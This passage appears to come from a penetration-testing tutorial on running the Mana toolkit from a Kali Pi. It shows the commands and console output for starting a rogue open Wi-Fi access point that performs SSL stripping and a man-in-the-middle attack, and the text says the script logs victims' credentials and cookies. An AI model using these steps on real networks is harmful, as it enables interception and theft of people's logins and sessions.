  md: '# Important Directories:


    +   - Mana program: /usr/share/mana-toolkit

    - Mana configuration settings: /etc/mana-toolkit/hostapd-mana.conf

    - Mana startup scripts: /usr/share/lib/mana-toolkit/run-mana

    - Mana captured traffic & logs: /var/lib/mana-toolkit


    # Running Mana


    In a Kali Pi terminal, enter the following:


    ```

    cd /usr/share/mana-toolkit

    cd run-mana

    ```


    In this directory you will find several scripts that you can run:


    ```

    root@kali-:/usr/share/mana-toolkit/run-mana# ls

    fireman-view.sh      start-noupstream-all.sh

    start-nat-full.sh    start-noupstream-eap.sh

    start-nat-simple.sh start-noupstream-eaponly.sh

    ```


    See the Manual for a complete description of what each script does. Like we did
    in the previous Mana chapter, we will run the start-nat-full script. This script
    creates a Wi-Fi Access Point, performs SSL strip (attempting to downgrade HTTPS
    to HTTP) and a man-in-the-middle attack on any clients that connect to it. It
    captures any credentials and cookies and stores them in the log folder.


    To start the:


    ```

    /start-nat-full.sh

    root@kali-:/usr/share/mana-toolkit/run-mana# ./start-nat-full.sh

    hostname WRT54G

    Current MAC:

    (TP-LINK TECHNOLOGIES CO., LTD.)

    Permanent MAC:

    (TP-LINK TECHNOLOGIES CO., LTD.)

    New MAC:

    06:0b:a2:91:b8:77

    configuration file: /etc/mana-toolkit/hostapd-mana.conf

    Using interface wlan0 with hwaddr 00:11:22:33:44:00 and ssid "Internet"

    wlan0: interface UNINITIALIZED->ENABLED

    wlan0: AP-ENABLED

    ```


    A new open Wi-Fi network should appear. We will be notified when someone connects
    to the rogue AP, and if they try to a webpage where credentials are entered, we
    should see a copy of them in the Mana-Toolkit logs, as seen below.


    I connected to the rogue AP from my smartphone and attempted to check my e-mail:'
